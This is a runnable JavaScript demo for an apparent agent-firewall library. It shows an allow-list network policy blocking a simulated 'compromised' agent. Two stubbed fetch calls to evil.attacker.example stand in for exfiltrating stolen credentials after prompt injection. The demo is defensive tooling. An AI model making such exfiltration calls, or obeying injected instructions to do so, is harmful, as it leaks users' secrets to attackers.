/**
 * Runnable demo: shows what an agentguard policy violation looks like.
 *
 *   node examples/demo-block.js
 *
 * Stages:
 *   1. Define a policy: only api.openai.com and api.anthropic.com allowed.
 *   2. A "good" agent makes an allowed call → succeeds.
 *   3. A "compromised" agent tries to exfiltrate to evil.attacker.example
 *      (a classic prompt-injection-driven scenario) → blocked with
 *      PolicyViolation.
 *
 * No real network calls. Pure deterministic demo.
 */
import { firewall, policy, PolicyViolation } from '../src/index.js';

const COLORS = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
};
const c = (col, s) => (process.stdout.isTTY ? col + s + COLORS.reset : s);

// Stub fetch globally so the demo is hermetic. The firewall wraps THIS,
// so blocked requests never even reach the stub.
globalThis.fetch = async (url) => new Response(`stub got: ${url}`, { status: 200 });

const tightPolicy = policy({
  network: {
    allow: ['api.openai.com', 'api.anthropic.com'],
    methods: ['GET', 'POST'],
  },
});

function banner(text) {
  console.log('\n' + '═'.repeat(64));
  console.log('  ' + text);
  console.log('═'.repeat(64));
}

banner('Policy: only api.openai.com and api.anthropic.com allowed');

banner('1. "Good" agent calls api.openai.com');
await firewall(tightPolicy, async () => {
  const r = await fetch('https://api.openai.com/v1/chat/completions', { method: 'POST' });
  console.log(c(COLORS.green, '  ✓ allowed') + ' — status ' + r.status);
  console.log(c(COLORS.dim, '    body: ') + (await r.text()));
});

banner('2. "Compromised" agent tries to exfiltrate via fetch');
console.log(c(COLORS.dim, '  (simulating: prompt injection causes agent to call attacker URL)\n'));

try {
  await firewall(tightPolicy, async () => {
    await fetch('https://evil.attacker.example/leak?data=stolen-creds');
    console.log(c(COLORS.red, '  ✗ THIS LINE SHOULD NOT PRINT'));
  });
} catch (err) {
  if (err instanceof PolicyViolation) {
    console.log(c(COLORS.red + COLORS.bold, '  ✓ BLOCKED'));
    console.log(c(COLORS.dim, '    reason: ') + c(COLORS.yellow, err.reason));
    console.log(c(COLORS.dim, '    detail: ') + err.detail);
    console.log(c(COLORS.dim, '    url:    ') + err.url);
    console.log(c(COLORS.dim, '    method: ') + err.method);
  } else {
    throw err;
  }
}

banner('3. Same scenario but with violations: "block" — returns a 403');

const blockingPolicy = policy({
  network: { allow: ['api.openai.com'] },
  violations: 'block',
});

await firewall(blockingPolicy, async () => {
  const r = await fetch('https://evil.attacker.example/leak');
  console.log(c(COLORS.green, '  → returned response (no throw)'));
  console.log(c(COLORS.dim, '    status:  ') + r.status);
  console.log(c(COLORS.dim, '    headers: ') + 'x-agentguard-block=' + r.headers.get('x-agentguard-block'));
  console.log(c(COLORS.dim, '    body:    ') + (await r.text()));
});

console.log('\n' + c(COLORS.dim, 'demo complete'));
